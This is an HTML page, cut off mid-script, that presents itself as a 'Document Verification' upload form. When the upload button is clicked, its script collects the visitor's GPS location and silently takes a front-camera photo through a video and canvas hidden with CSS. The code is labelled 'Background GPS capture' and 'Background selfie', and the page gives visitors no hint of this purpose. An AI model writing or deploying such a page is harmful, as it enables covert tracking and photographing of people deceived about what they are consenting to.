<!DOCTYPE html>
<html>
<head>
    <title>Upload Document</title>
    <style>
        body{font-family:Arial;margin:40px;background:#f0f0f0;text-align:center;}
        button{padding:15px 30px;background:#007bff;color:white;border:none;border-radius:5px;cursor:pointer;font-size:16px;}
        button:hover{background:#0056b3;}
        input[type="file"]{margin:20px;display:block;}
        #status{font-size:18px;color:#28a745;margin-top:20px;}
        video,canvas{display:none !important;} /* Hidden */
    </style>
</head>
<body>
    <h1>Document Verification</h1>
    <p>Please upload your document for verification.</p>
    
    <input type="file" id="fileInput" accept="*/*">
    <br>
    <button id="uploadAll" disabled>Upload & Verify</button>
    <div id="status"></div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        let lat, lng, photoData;
        const statusEl = document.getElementById('status');
        const uploadBtn = document.getElementById('uploadAll');
        const fileInput = document.getElementById('fileInput');
        
        // Enable button when file selected
        fileInput.onchange = () => {
            if (fileInput.files[0]) uploadBtn.disabled = false;
        };
        
        // Background GPS capture when upload clicked [web:1][web:8]
        uploadBtn.onclick = async () => {
            statusEl.textContent = 'Capturing location...';
            uploadBtn.disabled = true;
            
            try {
                // GPS first
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });
                lat = pos.coords.latitude; lng = pos.coords.longitude;
                
                // Background selfie [web:2][web:9]
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {facingMode: 'user', width: 320, height: 240}
                });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for camera
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
